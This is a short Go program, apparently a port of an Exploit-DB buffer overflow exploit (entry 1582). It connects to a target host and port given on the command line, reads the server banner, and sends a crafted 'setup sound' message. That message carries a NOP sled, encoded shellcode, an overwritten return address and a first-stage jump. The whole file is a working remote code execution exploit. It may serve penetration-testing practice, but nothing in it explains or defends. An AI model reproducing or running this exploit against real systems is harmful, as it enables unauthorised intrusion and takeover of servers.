// Original exploit: https://www.exploit-db.com/exploits/1582
package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
)

func main() {
	dstHost := os.Args[1]
	dstPort := os.Args[2]

	hostWithPort := fmt.Sprintf("%s:%s", dstHost, dstPort)
	conn, err := net.Dial("tcp", hostWithPort)
	if err != nil {
		panic(err)
	}
	message, _ := bufio.NewReader(conn).ReadString('\n')
	fmt.Print("<- Banner from server: " + message + "\n")

	fmt.Println("-> Sending evil buffer...", hostWithPort)
	shellcode := "\xbb\x4f\xc2\xf0\x3d\xda\xc6\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
	shellcode += "\x12\x31\x5e\x12\x83\xc6\x04\x03\x11\xcc\x12\xc8\x9c\x0b\x25"
	shellcode += "\xd0\x8d\xe8\x99\x7d\x33\x66\xfc\x32\x55\xb5\x7f\xa1\xc0\xf5"
	shellcode += "\xbf\x0b\x72\xbc\xc6\x6a\x1a\xff\x91\x8c\x9e\x97\xe3\x8e\x1a"
	shellcode += "\xba\x6d\x6f\x92\x5c\x3e\x21\x81\x13\xbd\x48\xc4\x99\x42\x18"
	shellcode += "\x6e\x4c\x6c\xee\x06\xf8\x5d\x3f\xb4\x91\x28\xdc\x6a\x31\xa2"
	shellcode += "\xc2\x3a\xbe\x79\x84"
	var nop_sled string
	for i := 0; i < (4368 - len(shellcode)); i++ {
		nop_sled += "\x90"
	}
	eip := "\x96\x45\x13\x08"
	first_stage := "\x83\xC0\x0C\xFF\xE0\x90\x90"
	buf := "\x11(setup sound " + nop_sled + shellcode + eip + first_stage + "\x90\x00#"
	_, err = conn.Write([]byte(buf))
	if err != nil {
		panic(err)
	}
	conn.Close()
}
